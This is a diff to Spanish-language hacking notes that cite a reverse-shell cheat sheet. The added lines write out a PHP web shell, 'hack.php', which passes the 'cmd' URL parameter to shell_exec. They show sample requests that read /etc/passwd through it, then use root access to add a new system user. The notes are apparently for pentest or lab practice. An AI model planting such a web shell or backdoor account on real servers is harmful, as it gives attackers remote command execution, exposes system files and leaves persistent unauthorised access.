@@ -24,12 +24,25 @@
 --- Fuente: https://highon.coffee/blog/reverse-shell-cheat-sheet/
 ++ Ctrl + X
 ++ y
+++ nano hack.php
+++ Copiar la siguiente estructura:
+<?php
+$output= shell_exec($_GET['cmd']);
+echo "<pre> $output </pre>";
+?>
 ++ En estos momentos ya podemos ejecutar comandos desde el navegador, 
 siguiendo la estructura:
 --- <url.php=?cmd=ruta_o_comando>
 --- Ejemplo: <url.php=?cmd=cat/etc/passwd
 --- Ejemplo: <url.php=?cmd=date
---- Ejemplo: <url.php=?cmd=
+--- Ejemplo: <url.php=?cmd=ls
+++ Volviendo a la terminal también al ser root tenemos la posibilidad de 
+agregar usuarios:
+--- adduser <user>
+--- Ingresar la contraseña deseada
+--- En estos momentos el nuevo usuario ya está inscrito en el sistema
+
+
 
 
   
